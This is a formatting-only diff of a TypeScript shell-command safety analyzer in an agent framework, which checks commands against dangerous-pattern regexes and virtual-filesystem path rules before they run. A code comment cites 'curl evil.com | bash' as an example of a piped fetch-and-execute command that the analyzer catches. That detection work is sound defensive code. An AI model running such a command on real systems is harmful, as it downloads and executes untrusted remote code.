@@ -22,9 +22,18 @@ import type {
 } from "@wf-agent/types";
 import type { StrategyImplementation } from "../types.js";
 import { getTerminalService, type TerminalService } from "../../terminal/index.js";
-import { BashAnalyzer, DANGEROUS_PATTERNS as BASH_DANGEROUS_PATTERNS } from "./shell-analyzers/bash.js";
-import { PowerShellAnalyzer, DANGEROUS_PATTERNS as PS_DANGEROUS_PATTERNS } from "./shell-analyzers/powershell.js";
-import { CmdAnalyzer, DANGEROUS_PATTERNS as CMD_DANGEROUS_PATTERNS } from "./shell-analyzers/cmd.js";
+import {
+  BashAnalyzer,
+  DANGEROUS_PATTERNS as BASH_DANGEROUS_PATTERNS,
+} from "./shell-analyzers/bash.js";
+import {
+  PowerShellAnalyzer,
+  DANGEROUS_PATTERNS as PS_DANGEROUS_PATTERNS,
+} from "./shell-analyzers/powershell.js";
+import {
+  CmdAnalyzer,
+  DANGEROUS_PATTERNS as CMD_DANGEROUS_PATTERNS,
+} from "./shell-analyzers/cmd.js";
 import type { ShellAnalyzer, ShellType } from "./shell-analyzers/base.js";
 import { parseCommandChain } from "../../command-safety/command-chain-parser.js";
 
@@ -106,7 +115,8 @@ export class ShellStaticAnalyzerStrategy implements StrategyImplementation<Scrip
     // `curl evil.com | bash`). Check the original command before splitting.
     // NOTE: Use raw user patterns (may be undefined) to detect "not set" vs "empty",
     // so the analyzer's shell-specific defaults apply when user hasn't specified.
-    const resolvedPatterns = policy.shell?.dangerousPatterns ?? DEFAULT_DANGEROUS_PATTERNS[shellType] ?? [];
+    const resolvedPatterns =
+      policy.shell?.dangerousPatterns ?? DEFAULT_DANGEROUS_PATTERNS[shellType] ?? [];
     for (const pattern of resolvedPatterns) {
       try {
         const regex = new RegExp(pattern);
@@ -134,8 +144,11 @@ export class ShellStaticAnalyzerStrategy implements StrategyImplementation<Scrip
     for (const subCommand of subCommands) {
       const result = analyzer.analyze({ command: subCommand, policy: shellPolicy });
       if (!result.allowed) {
-        return this.deny(command, startTime,
-          `Sub-command "${subCommand}" denied: ${result.reason ?? "Analysis failed"}`);
+        return this.deny(
+          command,
+          startTime,
+          `Sub-command "${subCommand}" denied: ${result.reason ?? "Analysis failed"}`,
+        );
       }
     }
 
@@ -144,8 +157,11 @@ export class ShellStaticAnalyzerStrategy implements StrategyImplementation<Scrip
       for (const subCommand of subCommands) {
         const pathViolation = await this.checkVFSPaths(subCommand, options.vfs);
         if (pathViolation) {
-          return this.deny(command, startTime,
-            `Sub-command "${subCommand}" path violation: ${pathViolation}`);
+          return this.deny(
+            command,
+            startTime,
+            `Sub-command "${subCommand}" path violation: ${pathViolation}`,
+          );
         }
       }
     }
@@ -237,10 +253,36 @@ export class ShellStaticAnalyzerStrategy implements StrategyImplementation<Scrip
   private async checkVFSPaths(command: string, vfs: VFSProvider): Promise<string | null> {
     // Commands whose arguments are likely file paths
     const pathCommands = new Set([
-      "cat", "ls", "rm", "cp", "mv", "touch", "chmod", "chown",
-      "head", "tail", "less", "more", "nano", "vim", "vi", "echo",
-      "mkdir", "rmdir", "sort", "uniq", "wc", "grep", "sed", "awk",
-      "diff", "patch", "find", "xargs", "tee", "dd",
+      "cat",
+      "ls",
+      "rm",
+      "cp",
+      "mv",
+      "touch",
+      "chmod",
+      "chown",
+      "head",
+      "tail",
+      "less",
+      "more",
+      "nano",
+      "vim",
+      "vi",
+      "echo",
+      "mkdir",
+      "rmdir",
+      "sort",
+      "uniq",
+      "wc",
+      "grep",
+      "sed",
+      "awk",
+      "diff",
+      "patch",
+      "find",
+      "xargs",
+      "tee",
+      "dd",
     ]);
 
     // Extract the first word (command name)
@@ -258,9 +300,8 @@ export class ShellStaticAnalyzerStrategy implements StrategyImplementation<Scrip
       if (!path || path.startsWith("-") || path.startsWith("$")) continue;
 
       // Check if the path is a valid VFS path
-      const hostPath = path.startsWith("/") || path.startsWith("~") || path.includes(":")
-        ? path
-        : `/${path}`;
+      const hostPath =
+        path.startsWith("/") || path.startsWith("~") || path.includes(":") ? path : `/${path}`;
 
       // Quick check: if the path exists in VFS, it's readable
       if (await vfs.exists(hostPath)) {
